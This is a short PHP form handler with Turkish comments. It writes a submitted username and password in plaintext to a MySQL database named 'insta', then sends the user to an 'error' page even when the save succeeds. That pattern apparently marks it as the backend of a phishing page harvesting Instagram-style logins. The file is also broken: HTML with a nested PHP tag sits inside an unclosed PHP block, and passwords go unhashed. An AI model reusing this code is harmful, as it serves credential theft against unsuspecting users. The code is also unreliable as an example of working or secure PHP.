<?php
// Hata raporlama
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Hata mesajı
$errorMessage = '';

// db.php dosyasındaki veritabanı bağlantısı
$host = 'localhost'; // Sunucu
$dbname = 'insta'; // Veritabanı adı
$username = 'root'; // Veritabanı kullanıcı adı
$password = ''; // Veritabanı şifresi

try {
    // PDO bağlantısı
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // Hata ayıklama modu
} catch (PDOException $e) {
    // Hata oluşursa mesaj verir
    die("Veritabanına bağlanılamadı: " . $e->getMessage());
}

// Form verilerini al
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $name = $_POST['name'];
    $sifre = $_POST['sifre'];

    // Boş alanları kontrol et
    if (empty($name) || empty($sifre)) {
        $errorMessage = 'Lütfen tüm alanları doldurun.';
    } else {
        // Veritabanına kayıt işlemi
        $sql = "INSERT INTO kullanicilar (name, sifre) VALUES (:name, :sifre)";
        $stmt = $pdo->prepare($sql);
        
        // Veritabanına verileri bağlama
        $stmt->bindParam(':name', $name);
        $stmt->bindParam(':sifre', $sifre);
        
        // Veritabanına veri ekleme ve yönlendirme
        if ($stmt->execute()) {
            // Başarı durumunda yönlendirme
            header('Location: hata.php'); // Yönlendirme yapılacak sayfa
            exit(); // Kodun çalışmasını durdur
        } else {
            $errorMessage = 'Bir hata oluştu, tekrar deneyin.';
        }
    }
    <!-- Hata Mesajı Kutusu -->
    <?php if (!empty($errorMessage)) : ?>
        <div class="error-message" id="error-message">
            <p class="error-text"><?php echo $errorMessage; ?></p>
            <button id="retry-btn" class="retry-btn" onclick="window.location.href='index.php';">Tekrar Dene</button>
        </div>
    <?php endif; ?>
}
?>

